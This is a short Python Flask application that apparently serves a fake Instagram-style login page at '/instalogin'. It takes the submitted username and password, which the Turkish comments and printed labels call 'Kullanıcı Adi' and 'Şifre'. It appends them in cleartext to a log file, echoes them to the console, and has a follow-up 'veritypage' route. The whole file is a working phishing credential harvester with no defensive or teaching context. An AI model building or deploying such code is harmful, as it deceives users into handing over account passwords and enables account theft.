from flask import Flask, request, render_template
import os

PEOPLE_FOLDER = os.path.join('static')

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = PEOPLE_FOLDER

@app.route("/")
def main_page():
    return render_template("mainpage.html")

@app.route('/instalogin', methods=['GET', 'POST'])
def index():
    full_filename = os.path.join(app.config['UPLOAD_FOLDER'], 'logo.png')
    if request.method == 'POST':
        fname = request.form['fname']
        lname = request.form['lname']
        
        # Verileri dosyaya yazma
        with open('log/user_info.log', 'a', encoding="utf-8") as f:
            f.write(f'K aDİ: {fname}\n')
            f.write(f"Password: {lname}\n\n")
        
        # Verileri ekrana yazdırma
        print(f'\n\nKullanıcı Adi: {fname}')
        print(f"Şifre: {lname}")
        print("User Name And Password Saves /log/user_info.log\n\n")
    
    return render_template('v3.0.html', user_image = full_filename)

@app.route("/veritypage")
def aaa():
    return render_template("veritypage.html")

if __name__ == '__main__':
    app.run(debug=True)
